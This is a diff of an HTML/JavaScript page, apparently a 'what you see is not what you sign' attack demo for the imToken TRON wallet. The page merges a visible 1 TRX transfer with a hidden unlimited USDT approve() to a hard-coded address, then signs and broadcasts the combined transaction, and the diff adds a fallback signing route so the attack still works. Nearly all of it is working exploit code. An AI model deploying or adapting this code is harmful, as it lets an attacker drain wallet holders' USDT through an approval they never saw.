@@ -3,129 +3,143 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>所﷼非所签 - TRX 转账隐藏 USDT 授权</title>
+    <title>所见非所签 - TRX 转账隐藏 USDT 授权</title>
     <style>
         body { font-family: Arial, sans-serif; padding: 20px; background: #1a1a2e; color: #fff; }
         button { padding: 12px 24px; font-size: 18px; margin: 10px; background: #e94560; border: none; color: #fff; border-radius: 8px; cursor: pointer; }
         pre { background: #16213e; padding: 15px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
-        .warning { color: #ff7b7b; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>🔓 所﷼非所签演示（imToken TRON）</h1>
-    <p>本页面将向你展示：<br>
-    👉 <b>钱包确认页显示：向 <span id="displayTo"></span> 转账 <strong>1 TRX</strong></b> <br>
-    👉 <b>实际签名交易包含：USDT 无限额度授权给同一地址</b></p>
-
-    <div>
-        <p>当前钱包地址：<span id="walletAddr" style="color:#0ff;">未连接</span></p>
-        <p>目标地址（收款 & 授权人）：<span id="targetAddr">TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz</span></p>
-    </div>
+    <h1>🔓 所见非所签攻击演示（imToken TRON）</h1>
+    <p>钱包确认页将显示：向 <strong id="targetAddrSpan">TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz</strong> 转账 <strong>1 TRX</strong><br>
+    实际链上执行：<strong>TRX 转账 + USDT 无限额度授权</strong></p>
 
     <button id="connectBtn">🔗 连接钱包</button>
-    <button id="attackBtn" disabled>💣 发起所﷼非所签交易</button>
+    <button id="attackBtn" disabled>💣 发起攻击</button>
+    <div id="log" style="margin-top:20px;"></div>
 
-    <div id="log" style="margin-top: 20px;"></div>
+    <script>
+        const TARGET = 'TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz';
+        const USDT   = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+        const TRX_AMT = 1000000;                       // 1 TRX = 10^6 sun
+        const UINT256_MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
-  <script>
-    const TARGET_ADDRESS = 'TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz';
-    const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-    const TRX_AMOUNT_SUN = 1000000;          // 1 TRX
-    const UINT256_MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+        let userAddress = null;
+        let tronWeb = null;
 
-    let userAddress = null;
-    let tronWeb = null;
+        function log(msg) {
+            document.getElementById('log').innerHTML += '<pre>' + msg + '</pre>';
+        }
 
-    function log(msg) {
-        document.getElementById('log').innerHTML += '<pre>' + msg + '</pre>';
-    }
-
-    // 连接钱包
-    document.getElementById('connectBtn').addEventListener('click', async () => {
-        try {
-            if (!window.tronWeb || !window.imToken) {
-                log('❌ 未检测到 imToken 环境，请在 imToken DApp 浏览器中打开');
-                return;
-            }
-            tronWeb = window.tronWeb;
-            const addr = tronWeb.defaultAddress.base58;
-            if (addr) {
-                userAddress = addr;
-                document.getElementById('walletAddr').innerText = userAddress;
+        // ---------- 连接钱包 ----------
+        document.getElementById('connectBtn').addEventListener('click', async () => {
+            try {
+                if (!window.tronWeb || !window.imToken) {
+                    log('❌ 请在 imToken 内置 DApp 浏览器中打开');
+                    return;
+                }
+                tronWeb = window.tronWeb;
+                // 先尝试从 tronWeb 获取地址
+                const addr = tronWeb.defaultAddress?.base58;
+                if (addr) {
+                    userAddress = addr;
+                } else {
+                    const account = await window.imToken.callPromisifyAPI('account.getWalletAddress', []);
+                    userAddress = account.address;
+                    tronWeb.setAddress(userAddress);
+                }
+                document.getElementById('walletAddr')?.remove();
                 document.getElementById('attackBtn').disabled = false;
                 log('✅ 已连接：' + userAddress);
-            } else {
-                // 备用
-                const account = await window.imToken.callPromisifyAPI('account.getWalletAddress', []);
-                userAddress = account.address;
-                tronWeb.setAddress(userAddress);
-                document.getElementById('walletAddr').innerText = userAddress;
-                document.getElementById('attackBtn').disabled = false;
-                log('✅ 已连接：' + userAddress);
+            } catch (e) {
+                log('❌ 连接失败：' + e.message);
             }
-        } catch (err) {
-            log('❌ 连接失败：' + err.message);
-        }
-    });
+        });
 
-    // 攻击
-    document.getElementById('attackBtn').addEventListener('click', async () => {
-        if (!userAddress) return alert('请先连接钱包');
-        try {
-            log('🛠️ 构造双重交易...');
+        // ---------- 构造双重交易 ----------
+        document.getElementById('attackBtn').addEventListener('click', async () => {
+            if (!userAddress) return alert('请先连接钱包');
+            try {
+                log('🛠️ 第一步：构造普通转账交易...');
+                const tx1 = await tronWeb.transactionBuilder.sendTrx(TARGET, TRX_AMT, userAddress);
+                
+                log('🛠️ 第二步：构造 USDT approve 调用...');
+                const tx2Resp = await tronWeb.transactionBuilder.triggerSmartContract(
+                    USDT,
+                    'approve(address,uint256)',
+                    { feeLimit: tronWeb.toSun(20) },
+                    [
+                        { type: 'address', value: TARGET },
+                        { type: 'uint256', value: UINT256_MAX }
+                    ],
+                    userAddress
+                );
+                const tx2 = tx2Resp.transaction;   // 注意取出真实交易对象
+                
+                if (!tx1?.raw_data?.contract || !tx2?.raw_data?.contract) {
+                    throw new Error('交易对象无效');
+                }
 
-            // 1. 普通转账交易
-            const tx1 = await tronWeb.transactionBuilder.sendTrx(
-                TARGET_ADDRESS,
-                TRX_AMOUNT_SUN,
-                userAddress
-            );
-            log('➡️ TransferContract 已生成');
+                // 合并两个合约
+                const combined = [...tx1.raw_data.contract, ...tx2.raw_data.contract];
+                const finalTx = JSON.parse(JSON.stringify(tx1));
+                finalTx.raw_data.contract = combined;
+                finalTx.raw_data.fee_limit = tronWeb.toSun(20);
+                delete finalTx.txID;
 
-            // 2. USDT approve 调用
-            const tx2Response = await tronWeb.transactionBuilder.triggerSmartContract(
-                USDT_CONTRACT,
-                'approve(address,uint256)',
-                { feeLimit: tronWeb.toSun(20) },
-                [
-                    { type: 'address', value: TARGET_ADDRESS },
-                    { type: 'uint256', value: UINT256_MAX }
-                ],
-                userAddress
-            );
-            const tx2 = tx2Response.transaction;  // 关键修复点
-            log('🔐 TriggerSmartContract 已生成');
+                log('🔄 合约数量：' + finalTx.raw_data.contract.length);
+                log('📋 第一个合约：TransferContract（钱包将仅显示此项）');
+                log('📋 第二个合约：TriggerSmartContract（USDT approve）');
 
-            // 校验
-            if (!tx1?.raw_data?.contract || !tx2?.raw_data?.contract) {
-                throw new Error('交易对象缺少 raw_data.contract');
+                // ---------- 尝试发送（若仍失败则走签名+广播路线） ----------
+                let success = false;
+                try {
+                    log('📡 尝试 tron.sendTransaction...');
+                    const res = await window.imToken.callPromisifyAPI('tron.sendTransaction', finalTx);
+                    log('✅ 成功：' + JSON.stringify(res));
+                    success = true;
+                } catch (sendErr) {
+                    log('⚠️ tron.sendTransaction 失败：' + sendErr.message);
+                    log('↪️ 改用 tron.signTransaction + 手动广播...');
+
+                    // 1. 签名
+                    const signedTx = await window.imToken.callPromisifyAPI('tron.signTransaction', finalTx);
+                    // imToken 签名后可能返回形如 { signedTransaction: "hex..." } 或直接返回 hex 字符串
+                    let signedHex = '';
+                    if (typeof signedTx === 'string') {
+                        signedHex = signedTx;
+                    } else if (signedTx && typeof signedTx === 'object') {
+                        signedHex = signedTx.signedTransaction || signedTx.transaction || signedTx.txID || signedTx;
+                        if (typeof signedHex === 'object') {
+                            // 部分版本返回完整的已签名交易对象，需要序列化为 hex
+                            if (signedTx.signature) {
+                                signedHex = tronWeb.utils.transaction.txPbToRawData(signedTx);
+                            }
+                        }
+                    }
+
+                    if (!signedHex || typeof signedHex !== 'string') {
+                        throw new Error('未能从签名结果中提取 hex 数据: ' + JSON.stringify(signedTx));
+                    }
+
+                    log('✍️ 签名完成（用户仅在确认页看到转账）');
+                    log('🔐 签名结果前缀：' + signedHex.substring(0, 50) + '...');
+
+                    // 2. 广播
+                    const broadcastRes = await tronWeb.trx.sendRawTransaction(signedHex);
+                    log('📡 广播成功：' + JSON.stringify(broadcastRes));
+                    success = true;
+                }
+
+                if (success) {
+                    log('✅ 攻击完成。请前往 TronScan 查看交易内部调用，应包含 USDT approve');
+                }
+            } catch (err) {
+                log('❌ 致命错误：' + err.message);
+                console.error(err);
             }
-
-            // 合并合约调用
-            const combinedContract = [
-                ...tx1.raw_data.contract,
-                ...tx2.raw_data.contract
-            ];
-
-            // 克隆转账交易作为最终交易
-            const finalTx = JSON.parse(JSON.stringify(tx1));
-            finalTx.raw_data.contract = combinedContract;
-            finalTx.raw_data.fee_limit = tronWeb.toSun(20); // 手续费
-            delete finalTx.txID;
-
-            log('📦 合约数：' + finalTx.raw_data.contract.length);
-            log('📡 调用 imToken.callPromisifyAPI(\'tron.sendTransaction\') …');
-
-            // 提交
-            const result = await window.imToken.callPromisifyAPI('tron.sendTransaction', finalTx);
-            log('✅ 交易已提交：' + JSON.stringify(result));
-            log('⚠️ 请在钱包确认页查看是否仅显示 TRX 转账');
-        } catch (err) {
-            log('❌ 错误：' + err.message);
-            console.error(err);
-            log('💡 如仍出错，请打开控制台查看 tronWeb 版本结构');
-        }
-    });
-</script>
+        });
+    </script>
 </body>
 </html>
